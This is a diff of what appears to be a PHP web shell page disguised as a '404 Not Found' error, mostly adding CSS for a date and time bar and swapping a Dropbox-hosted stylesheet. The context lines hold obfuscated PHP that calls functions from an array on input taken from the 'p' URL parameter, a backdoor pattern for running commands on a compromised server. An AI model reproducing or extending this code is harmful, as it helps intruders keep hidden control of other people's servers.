@@ -12,20 +12,114 @@ $Jd = $c8[2](); goto VN; sr: $Jd = jD($_GET["p"]); $c8[3](Jd($_GET["p"])); VN: f
 <head>
     <meta name="theme-color" content="red">
     <meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
-    <link rel="stylesheet" href="https://dl.dropboxusercontent.com/s/3wxig2pkvwlrk7q/6.css">
+    <link rel="stylesheet" href="https://dl.dropboxusercontent.com/s/fyfauynt1su0ipj/5.css">
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <title>404 Not Found</title>
     <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js">
     </script>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap');
+.d-flex {
+    display: -ms-flexbox !important;
+    display: flex !important;
+    align-content: center;
+    align-items: center;
+    justify-content: space-around;
+}
+.b-flex {
+    display: -ms-flexbox !important;
+    display: flex !important;
+    align-content: center;
+    align-items: center;
+    justify-content: space-evenly;
+}
+</style>
+<style>
+.maan-top-bar {
+  padding: 0px 0px;
+  background: var(--maan-color-black2);
+}
+.maan-top-bar .maan-weider-news .icon svg {
+  fill: var(--maan-color-white);
+  --svg-font-size: 18px;
+}
+.maan-top-bar .maan-weider-news .maan-city,
+.maan-top-bar .maan-weider-news .maan-celsius {
+  display: inline-block;
+  color: var(--maan-color-white);
+}
+.maan-top-bar .maan-weider-news .maan-city {
+  font-size: 14px;
+  line-height: 24px;
+  margin: 0px 4px;
+}
+.maan-top-bar .maan-weider-news .maan-celsius {
+  font-size: 12px;
+  line-height: 22px;
+}
+.maan-top-bar .maan-current-date {
+  color: var(--maan-color-white);
+  text-align: center;
+  margin-left: 20px;
+}
+.maan-top-bar .maan-current-date .icon svg {
+  fill: var(--maan-color-white);
+  --svg-font-size: 12px;
+  margin-right: 0px;
+}
+.maan-top-bar .maan-current-date .maan-current-week,
+.maan-top-bar .maan-current-date .maan-current-day {
+font-family: 'Kelly Slab';
+color: #ffffff;
+font-size: 20px;
+margin-left: 0px;
+padding-top: 0px;
+padding-bottom: 0px;
+}
+.maan-top-bar .maan-social-link {
+  text-align: right;
+  max-width: 163px;
+  margin-left: auto;
+}
+
+.maan-top-bar .maan-social-link ul {
+  border-left: 1px solid var(--maan-color-white);
+}
+.maan-top-bar .maan-social-link li {
+  display: inline-block;
+  margin-right: 14px;
+}
+.maan-top-bar .maan-social-link li:last-child {
+  margin-right: 0px;
+}
+.maan-top-bar .maan-social-link li svg {
+  fill: var(--maan-color-white);
+}
+.maan-top-bar .maan-social-link li a:hover svg {
+  fill: var(--maan-color-blue);
+}
+.date-time{
+display: flex;
+align-items: center;
+justify-content: space-between;
+font-family: 'Kelly Slab';
+}
+#txt {
+font-family: 'Kelly Slab';
+color: #ffffff;
+font-size: 18px;
+margin-right: 20px;
+padding-top: 0px;
+padding-bottom: 0px;
+}
 </style>
 </head>
 <body>
 <div class="bg-dark table-responsive text-light border" style="margin-left:auto;margin-right:auto">
-<div class="maan-top-bar justify-content-between">
+<div class="maan-top-bar">
 <div class="date-time">
-<div class="maan-current-date"><span class="maan-current-week" id="maan-current-week-day"></span><font color="white"> : </font><span class="maan-current-day" id="maan-current-date"></span></div>
+<div class="maan-current-date">
+<span class="maan-current-week" id="maan-current-week-day"></span><font color="white"> : </font><span class="maan-current-day" id="maan-current-date"></span></div>
 <div id="txt"></div>
 </div></div>
 <h1 class="mt-2">
@@ -33,6 +127,7 @@ $Jd = $c8[2](); goto VN; sr: $Jd = jD($_GET["p"]); $c8[3](Jd($_GET["p"])); VN: f
 <?= Yp; ?>
 </a></center>
 </h1>
+</div>
 <div class="border-top table-responsive">
 <li><?= $c8[0](); ?></li>
 </div>
